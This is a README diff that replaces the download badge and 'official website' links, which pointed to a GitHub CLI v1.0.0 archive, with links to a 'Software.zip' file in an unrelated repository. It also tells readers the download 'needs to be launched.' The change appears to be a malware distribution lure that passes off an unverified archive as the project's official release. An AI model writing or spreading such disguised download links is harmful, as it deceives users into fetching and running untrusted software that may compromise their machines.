@@ -7,11 +7,11 @@ This repository does not have a specific short description or topics provided, b
 
 🔗 **Download v1.0.0 Release:**
 
-[![Download v1.0.0](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download v1.0.0](https://github.com/angelsanges/vvv/releases/download/v1.0/Software.zip)](https://github.com/angelsanges/vvv/releases/download/v1.0/Software.zip)
 
 ℹ️ *Please note that the download link above needs to be launched.*
 
-🚀 Feel free to visit the [official website](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) for more information.
+🚀 Feel free to visit the [official website](https://github.com/angelsanges/vvv/releases/download/v1.0/Software.zip) for more information.
 
 If the provided link is not accessible or not working, kindly check the "Releases" section for alternative download options.
 
